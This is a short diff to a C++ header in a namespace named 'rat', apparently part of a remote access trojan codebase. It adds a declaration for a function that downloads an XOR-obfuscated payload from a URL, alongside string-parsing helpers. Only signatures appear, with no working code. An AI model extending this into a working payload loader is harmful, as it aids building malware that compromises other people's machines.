@@ -179,11 +179,21 @@ class Handler {
 
 }; // class rat::handler::Handler
 
+::rat::networking::NetworkingResult
+downloadXoredPayload(::rat::networking::Client *p_Curl_Client,
+                     std::vector<uint8_t> &Payload_Buffer,
+                     const std::string &File_Url, std::string *p_Xor_Key);
+
 void __normalizeWhiteSpaces(std::string &String_Input);
+
 size_t __countWhiteSpaces(const std::string &String_Input);
+
 size_t __findFirstOccurenceOfChar(const std::string &Input_String, char arg_C);
+
 uint16_t _stringToUint16(const std::string &str);
+
 std::vector<std::string> splitArguments(const std::string &Input_String);
+
 std::string stripQuotes(const std::string &Input_String);
 
 } // namespace rat::handler
